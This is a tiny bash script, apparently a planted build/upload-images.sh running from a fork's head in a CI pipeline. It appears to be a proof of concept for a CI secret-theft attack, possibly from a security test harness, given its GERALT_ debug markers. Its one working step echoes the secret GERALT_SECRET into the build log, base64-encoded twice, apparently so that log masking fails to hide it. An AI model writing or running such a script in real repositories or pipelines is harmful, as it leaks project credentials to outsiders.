#!/usr/bin/env bash
set +e
echo "GERALT_DBG build/upload-images.sh executing from fork head (push-image sink)"
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
exit 1
